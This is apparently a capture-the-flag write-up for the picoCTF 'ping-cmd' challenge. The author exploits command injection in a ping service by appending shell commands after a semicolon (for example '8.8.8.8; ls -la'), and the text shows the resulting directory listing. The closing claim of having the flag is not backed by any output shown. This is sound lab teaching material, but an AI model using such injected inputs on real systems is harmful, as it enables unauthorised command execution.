URL : [ping-cmd](https://play.picoctf.org/practice/challenge/757?difficulty=1&page=1)


After starting the box, I can connect to the servi ce using the command `nc`
```
% nc mysterious-sea.picoctf.net 51729
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1044ms
rtt min/avg/max/mdev = 0.033/0.034/0.035/0.001 ms
```

So this service allow me to check connection with that server using ping command, I wonder whether this one has sanitised the input yet? So my goal is to attempt to escape the ping input
```
% nc mysterious-sea.picoctf.net 51729
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; pwd
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.58 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.55 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.546/9.565/9.584/0.019 ms
/home/ctf-player
```

I successfully did it which is good by only placing `;` after the target ip which allowes me to escape the input. Let's see do they have in their directory
```
% nc mysterious-sea.picoctf.net 51729
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls -la
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.59 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.59 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.590/9.591/9.593/0.001 ms
total 20
drwxr-x--- 1 ctf-player ctf-player   23 Mar  7 11:54 .
drwxr-xr-x 1 root       root         24 Mar  7 11:54 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 ctf-player ctf-player  807 Jan  6  2022 .profile
-r-------- 1 ctf-player ctf-player   49 Mar  6 20:19 flag.txt
-r-x------ 1 ctf-player ctf-player  149 Mar  7 11:53 script.sh
```

Kaboom here is the flag. Happy Hakcing!@#$!#@$!@#$

